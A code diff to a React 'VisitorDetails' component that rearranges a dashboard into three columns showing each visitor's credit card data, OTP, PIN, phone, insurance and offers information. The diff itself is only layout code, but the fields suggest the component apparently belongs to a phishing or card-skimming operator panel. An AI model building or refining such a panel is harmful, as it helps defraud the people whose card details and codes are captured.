@@ -574,9 +574,9 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             <p>لا توجد بيانات لعرضها</p>
           </div>
         ) : (
-          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4" dir="rtl">
-            {/* Left Column - Credit Card Only */}
-            <div className="flex flex-col gap-3">
+          <div className="grid grid-cols-1 lg:grid-cols-3 gap-3" dir="rtl">
+            {/* Right Column - Credit Card Only */}
+            <div className="flex flex-col gap-2">
               {sortedBubbles.filter(b => b.id === "card-info").map((bubble) => (
             <DataBubble
               key={bubble.id}
@@ -665,9 +665,14 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
               ))}
             </div>
 
-            {/* Right Column - All Other Cards */}
-            <div className="flex flex-col gap-3">
-              {sortedBubbles.filter(b => b.id !== "card-info").map((bubble) => (
+            {/* Middle Column - Dynamic Cards (OTP, PIN, Phone, etc.) */}
+            <div className="flex flex-col gap-2">
+              {sortedBubbles.filter(b => 
+                b.id !== "card-info" && 
+                b.id !== "basic-info" && 
+                b.id !== "insurance-info" && 
+                b.id !== "offers-info"
+              ).map((bubble) => (
             <DataBubble
               key={bubble.id}
               title={bubble.title}
@@ -737,6 +742,26 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                   </div>
                 ) : null
               }
+            />
+              ))}
+            </div>
+
+            {/* Left Column - Static Info (Basic, Insurance, Offers) */}
+            <div className="flex flex-col gap-2">
+              {sortedBubbles.filter(b => 
+                b.id === "basic-info" || 
+                b.id === "insurance-info" || 
+                b.id === "offers-info"
+              ).map((bubble) => (
+            <DataBubble
+              key={bubble.id}
+              title={bubble.title}
+              data={bubble.data}
+              timestamp={bubble.timestamp}
+              status={bubble.status}
+              showActions={false}
+              isLatest={false}
+              layout="vertical"
             />
               ))}
             </div>
